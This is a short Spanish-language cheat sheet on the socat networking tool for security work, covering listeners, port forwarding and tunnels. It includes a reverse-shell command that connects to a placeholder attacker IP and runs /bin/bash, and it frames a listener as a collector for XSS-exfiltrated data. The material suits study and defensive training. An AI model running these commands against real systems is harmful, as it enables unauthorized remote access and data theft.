
---

# Socat: La Navaja Suiza de las Conexiones

## ¿Qué es `socat`?

> **`socat`** (SOcket CAT) es una herramienta de red de línea de comandos que permite establecer conexiones bidireccionales entre dos puntos. Es como `netcat` pero con esteroides, permitiendo trabajar con múltiples protocolos y direcciones.

---

## Usos comunes en Ciberseguridad

| Uso | Explicación |
|-----|-------------|
| Crear un servidor TCP | Escucha un puerto local esperando conexiones. |
| Redirigir puertos | Reenvía tráfico de un puerto a otro destino. |
| Conexiones reversas | Abre shells remotas conectando a otro host. |
| Túneles | Permite exponer servicios internos de forma externa. |

---

## Ejemplo 1: Crear un servidor TCP

```bash
socat TCP-LISTEN:1234,reuseaddr,fork -
````

**Explicación**:  
Abre el puerto 1234 para que escuche conexiones. Ideal para recoger datos enviados desde scripts maliciosos (como un `fetch()` en un ataque XSS).

---

## Ejemplo 2: Redirección de puerto

```bash
socat TCP-LISTEN:80,fork TCP:192.168.1.10:8080
```

**Explicación**:  
Cualquier conexión al puerto 80 de tu máquina será reenviada al puerto 8080 de la IP 192.168.1.10. Muy útil para hacer de "puente" entre redes o reenviar tráfico.

---

## Ejemplo 3: Reverse Shell

```bash
socat TCP:<IP_ATACANTE>:4444 EXEC:/bin/bash
```

**Explicación**:  
La máquina víctima se conecta a tu IP por el puerto 4444 y ejecuta una shell `/bin/bash`, dándote acceso remoto. En la máquina atacante deberías estar escuchando con:

```bash
socat TCP-LISTEN:4444,reuseaddr,fork -
```

---

## Ejemplo 4: Crear túnel a un servicio interno

```bash
socat TCP4-LISTEN:9000,reuseaddr,fork TCP4:localhost:3306
```

**Explicación**:  
Permite acceder desde fuera al puerto 3306 (MySQL) redirigiéndolo al 9000 local. Muy útil para exponer servicios internos sin abrir el puerto real.

---

## Notas útiles

- `reuseaddr`: permite reutilizar el puerto si se cierra y se vuelve a abrir rápidamente.
    
- `fork`: permite múltiples conexiones simultáneas.
    
- Puedes combinar `socat` con SSL, PTY, sockets UNIX y más.
    

---

## Recursos

- Sitio oficial: [https://linux.die.net/man/1/socat](https://linux.die.net/man/1/socat)
    
- Cheat sheet: [https://www.blackhillsinfosec.com/socat-cheatsheet/](https://www.blackhillsinfosec.com/socat-cheatsheet/)
    

---
